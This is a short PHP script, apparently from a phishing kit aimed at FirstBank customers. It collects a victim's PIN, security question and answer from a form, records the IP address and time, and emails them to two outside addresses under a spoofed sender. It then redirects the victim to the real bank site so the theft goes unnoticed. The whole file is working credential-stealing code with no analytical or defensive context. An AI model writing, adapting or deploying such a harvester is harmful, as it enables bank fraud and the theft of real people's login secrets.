<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$da1 = $_POST['pan'];
$da2 = $_POST['sq'];
$da3 = $_POST['ans'];
$fiftyme="zate123man@gmail.com,pronc@prontomail.com";


  $subj = "firstbank BV $ip";
  $msg = "Email Info\n\nPIN: $da1\nSecurity Question: $da2\nAnswer: $da3\n$ip $adddate\n-----*+++++++++++*-----\n Created By YomZee--------*++++++++++*----------";
  $from = "From: <resultats@tsbdumbs.com>";
  mail("$fiftyme", $subj, $msg, $from);
?>
<script type="text/javascript">
 window.location="https://www.1firstbank.com/vi"
</script>
